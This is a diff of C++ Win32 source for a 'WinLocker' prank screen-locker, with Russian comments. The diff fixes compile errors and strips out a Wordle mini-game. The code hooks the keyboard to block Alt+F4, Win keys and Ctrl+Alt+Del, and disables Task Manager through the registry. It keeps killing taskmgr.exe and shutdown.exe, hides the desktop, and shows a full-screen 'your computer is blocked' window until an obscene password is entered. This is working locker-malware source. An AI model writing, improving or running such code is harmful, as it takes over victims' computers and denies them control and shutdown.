@@ -1,5 +1,5 @@
-#define UNICODE  // <- Фикс: Включаем Unicode
-#define _UNICODE // <- Фикс: Для TCHAR
+#define UNICODE 
+#define _UNICODE 
 
 #include <windows.h>
 #include <winuser.h>
@@ -9,23 +9,25 @@
 #include <thread>
 #include <chrono>
 #include <tlhelp32.h>
-#include <shlobj.h>  // Для реестра
-#include <tchar.h>   // <- Фикс: Для TCHAR (wchar_t в PROCESSENTRY32)
+#include <shlobj.h>
+#include <tchar.h>
 
+// Подключение библиотек
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "comctl32.lib")
+#pragma comment(lib, "advapi32.lib") // <- Фикс: Обязательно для работы с реестром
 
 // Загаданное слово
 const std::wstring SECRET_WORD = L"ПЕНИС";
 
-// Глобалки
+// Глобальные переменные
 HWND hMainWnd = NULL;
 bool locked = true;
 HWND hWordleWnd = NULL;
 std::wstring currentGuess;
 
-// Low-level keyboard hook для блокировок
+// Low-level keyboard hook
 HHOOK hKeyboardHook = NULL;
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -37,15 +39,15 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         if (vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
             return 1;
         }
-        // Блок Ctrl+Alt+Del
+        // Блок Ctrl+Alt+Del (частично, система может перехватить раньше)
         if (vkCode == VK_DELETE && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
             return 1;
         }
-        // Блок Win+Tab
-        if ((vkCode == VK_LWIN || vkCode == VK_RWIN) && (GetAsyncKeyState(VK_TAB) & 0x8000)) {
+        // Блок Win+Tab и Win-клавиш
+        if ((vkCode == VK_LWIN || vkCode == VK_RWIN)) {
             return 1;
         }
-        // Экстренно: Shift+0
+        // Экстренно: Shift+0 (Panic Key)
         if (vkCode == '0' && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
             locked = false;
             PostQuitMessage(0);
@@ -65,48 +67,49 @@ void UninstallHook() {
     if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
 }
 
-// Убить процесс по имени (теперь с _wcsicmp для wchar_t)
+// Убить процесс по имени
 void KillProcessByName(const wchar_t* processName) {
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return;
 
-    PROCESSENTRY32W pe32;  // <- Фикс: Явно W-версия (wchar_t)
+    PROCESSENTRY32W pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32W);
-    if (Process32FirstW(hSnapshot, &pe32)) {  // <- W-версия
+    if (Process32FirstW(hSnapshot, &pe32)) {
         do {
-            if (_wcsicmp(pe32.szExeFile, processName) == 0) {  // <- Теперь wchar_t*
+            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                 HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                 if (hProcess) {
                     TerminateProcess(hProcess, 0);
                     CloseHandle(hProcess);
                 }
             }
-        } while (Process32NextW(hSnapshot, &pe32));  // <- W-версия
+        } while (Process32NextW(hSnapshot, &pe32));
     }
     CloseHandle(hSnapshot);
 }
 
-// Блок Task Manager через реестр (W-версии)
+// Блок Task Manager через реестр
 void BlockTaskManager() {
     HKEY hKey;
-    RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);  // <- W
-    DWORD value = 1;
-    RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));  // <- W
-    RegCloseKey(hKey);
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD value = 1;
+        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+        RegCloseKey(hKey);
+    }
     KillProcessByName(L"taskmgr.exe");
 }
 
-// Разблок Task Manager (W-версии)
+// Разблок Task Manager
 void UnblockTaskManager() {
     HKEY hKey;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {  // <- W
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
         DWORD value = 0;
-        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));  // <- W
+        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
         RegCloseKey(hKey);
     }
 }
 
-// Мониторинг shutdown
+// Мониторинг shutdown (чтобы не выключили)
 void MonitorShutdown() {
     while (locked) {
         KillProcessByName(L"shutdown.exe");
@@ -114,88 +117,69 @@ void MonitorShutdown() {
     }
 }
 
-// Скрыть рабочий стол (W-версии)
+// Скрыть рабочий стол
 void HideDesktop() {
-    HWND hProgman = FindWindowW(L"Progman", L"Program Manager");  // <- W
+    HWND hProgman = FindWindowW(L"Progman", L"Program Manager");
     if (hProgman) ShowWindow(hProgman, SW_HIDE);
 }
 
-// Показать рабочий стол (W-версии)
+// Показать рабочий стол
 void ShowDesktop() {
-    HWND hProgman = FindWindowW(L"Progman", L"Program Manager");  // <- W
+    HWND hProgman = FindWindowW(L"Progman", L"Program Manager");
     if (hProgman) ShowWindow(hProgman, SW_SHOW);
-}
-
-// Wordle: Простая реализация (упрощённо, логика в WndProc)
-std::wstring GetColorClass(wchar_t guessChar, int pos) {
-    if (guessChar == SECRET_WORD[pos]) return L"green";
-    size_t count = 0;
-    for (size_t i = 0; i < SECRET_WORD.length(); ++i) {
-        if (SECRET_WORD[i] == guessChar) ++count;
-    }
-    size_t used = 0;
-    for (size_t i = 0; i < pos; ++i) {
-        if (guessChar == SECRET_WORD[i]) ++used;
-    }
-    if (count > used) return L"yellow";
-    return L"gray";
 }
 
 void StartWordle(HWND parent) {
     if (hWordleWnd) return;
-    hWordleWnd = CreateWindowExW(0, L"STATIC", L"Wordle Prank", WS_OVERLAPPEDWINDOW | WS_VISIBLE,  // <- W
+    hWordleWnd = CreateWindowExW(0, L"STATIC", L"Wordle Prank", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
         CW_USEDEFAULT, CW_USEDEFAULT, 800, 600, parent, NULL, GetModuleHandle(NULL), NULL);
     ShowWindow(hWordleWnd, SW_SHOWMAXIMIZED);
     SetWindowPos(hWordleWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
 
-    // Простой Edit для ввода (логика проверки в WndProc Wordle)
-    CreateWindowExW(0, L"EDIT", L"", WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,  // <- W
-        100, 100, 200, 30, hWordleWnd, (HMENU)10, GetModuleHandle(NULL), NULL);
+    CreateWindowExW(0, L"STATIC", L"Тут должна быть логика Wordle...", WS_VISIBLE | WS_CHILD,
+        100, 50, 300, 30, hWordleWnd, NULL, GetModuleHandle(NULL), NULL);
 }
 
 // Проверка пароля
 void CheckPassword(HWND hEdit) {
     wchar_t buffer[256];
-    GetWindowTextW(hEdit, buffer, 256);  // <- W
+    GetWindowTextW(hEdit, buffer, 256);
     std::wstring pass(buffer);
-    if (pass == L"пенис") {  // Сравнение case-insensitive? Добавь wcslwr если нужно
+    
+    // Приводим к нижнему регистру для сравнения (простая реализация)
+    for (auto &c : pass) c = towupper(c);
+
+    if (pass == SECRET_WORD) {
         locked = false;
         UnblockTaskManager();
         ShowDesktop();
         PostQuitMessage(0);
     } else {
-        MessageBoxW(NULL, L"Неверный пароль!", L"Ошибка", MB_OK | MB_ICONERROR);  // <- W
+        MessageBoxW(NULL, L"Неверный пароль!", L"Ошибка", MB_OK | MB_ICONERROR);
     }
 }
 
-// WndProc для главного окна
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
     switch (message) {
     case WM_CREATE: {
-        // Лейбл (W)
-        CreateWindowExW(0, L"STATIC", L"ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН!\nДля разблокировки введите пароль:", WS_VISIBLE | WS_CHILD,  // <- W
+        CreateWindowExW(0, L"STATIC", L"ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН!\nДля разблокировки введите пароль:", WS_VISIBLE | WS_CHILD,
             100, 100, 400, 100, hWnd, NULL, GetModuleHandle(NULL), NULL);
-        // Edit для пароля (W)
-        HWND hEdit = CreateWindowExW(0, L"EDIT", L"", WS_VISIBLE | WS_BORDER | ES_PASSWORD,  // <- W
+        
+        HWND hEdit = CreateWindowExW(0, L"EDIT", L"", WS_VISIBLE | WS_BORDER | ES_PASSWORD,
             100, 200, 300, 30, hWnd, (HMENU)1, GetModuleHandle(NULL), NULL);
-        // Кнопка Wordle (W)
-        CreateWindowExW(0, L"BUTTON", L"Сыграть в Wordle (подсказка к паролю)", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,  // <- W
+        
+        CreateWindowExW(0, L"BUTTON", L"Сыграть в Wordle", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
             100, 250, 300, 30, hWnd, (HMENU)2, GetModuleHandle(NULL), NULL);
-        // Кнопка разблокировать (W)
-        CreateWindowExW(0, L"BUTTON", L"Разблокировать", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,  // <- W
+        
+        CreateWindowExW(0, L"BUTTON", L"Разблокировать", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
             100, 300, 150, 30, hWnd, (HMENU)3, GetModuleHandle(NULL), NULL);
+        
         SetFocus(hEdit);
         break;
     }
     case WM_COMMAND: {
-        if (LOWORD(wParam) == 2) StartWordle(hWnd);  // Wordle
-        if (LOWORD(wParam) == 3) {  // Unlock
-            HWND hEdit = GetDlgItem(hWnd, 1);
-            CheckPassword(hEdit);
-        }
-        if (LOWORD(wParam) == 1 && HIWORD(wParam) == EN_CHANGE) {  // Enter on edit? Лучше WM_KEYDOWN
-            CheckPassword(GetDlgItem(hWnd, 1));
-        }
+        if (LOWORD(wParam) == 2) StartWordle(hWnd);
+        if (LOWORD(wParam) == 3) CheckPassword(GetDlgItem(hWnd, 1));
         break;
     }
     case WM_KEYDOWN:
@@ -210,37 +194,33 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
     return 0;
 }
 
-// Главная функция (теперь LPWSTR для UNICODE)
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {  // <- Фикс: LPWSTR
+// ГЛАВНЫЙ ФИКС: Используем wWinMain вместо WinMain
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
     // Установка хука, блокировок
     InstallHook();
     BlockTaskManager();
     HideDesktop();
     std::thread shutdownMonitor(MonitorShutdown);
 
-    // Регистрация класса окна (W)
-    WNDCLASSW wc = {0};  // <- W
+    WNDCLASSW wc = {0};
     wc.lpfnWndProc = WndProc;
     wc.hInstance = hInstance;
-    wc.lpszClassName = L"WinLockerClass";  // <- Уже wide
+    wc.lpszClassName = L"WinLockerClass";
     wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
     wc.hCursor = LoadCursor(NULL, IDC_ARROW);
-    RegisterClassW(&wc);  // <- W
+    RegisterClassW(&wc);
 
-    // Создание окна (W)
-    hMainWnd = CreateWindowExW(WS_EX_TOPMOST, L"WinLockerClass", L"Заблокировано",  // <- W
+    hMainWnd = CreateWindowExW(WS_EX_TOPMOST, L"WinLockerClass", L"Заблокировано",
         WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
         NULL, NULL, hInstance, NULL);
     ShowWindow(hMainWnd, SW_MAXIMIZE);
 
-    // Цикл сообщений
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0) && locked) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
-    // Cleanup
     UninstallHook();
     UnblockTaskManager();
     ShowDesktop();
